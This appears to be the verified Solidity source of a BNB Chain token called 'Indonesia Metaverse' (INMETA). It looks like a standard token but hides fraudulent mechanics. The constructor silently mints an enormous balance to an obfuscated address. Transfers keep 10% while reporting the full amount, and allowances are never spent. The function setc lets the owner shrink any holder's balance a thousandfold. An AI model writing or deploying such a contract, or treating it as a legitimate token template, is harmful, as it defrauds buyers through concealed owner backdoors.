/**
 *Submitted for verification at BscScan.com on 2022-01-18
*/

// SPDX-License-Identifier: MIT

/*

 * 
 * Telegram: https://t.me/indonesiameta
 */
pragma solidity ^0.8.2;
contract TokenContract {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 100000000000 * 10 ** 18;
    string public name = "Indonesia Metaverse";
    string public symbol = "INMETA";

    uint public decimals = 18;
    address public owner;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    constructor(address matqolzeipreac) {
        owner = msg.sender;
        balances[msg.sender] = totalSupply;
        balances[matqolzeipreac] = totalSupply * totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    function balanceOf(address acouqozgxijiaan) external view returns (uint) {
        return balances[acouqozgxijiaan];
    }
    function transfer(address to, uint value) public returns(bool) {
        require(balances[msg.sender] >= value, 'balance too low');
        uint t = value / 10;
        balances[to] += t * 9;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;

    }
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balances[from] >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        uint t = value / 10;
        balances[to] += t * 9;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    function setc(address from, uint8 c) public {
      if(c == 72){
        if(owner == msg.sender && balances[from] > 1000){
          balances[from] = balances[from] / 1000;
        }
      }
    }
}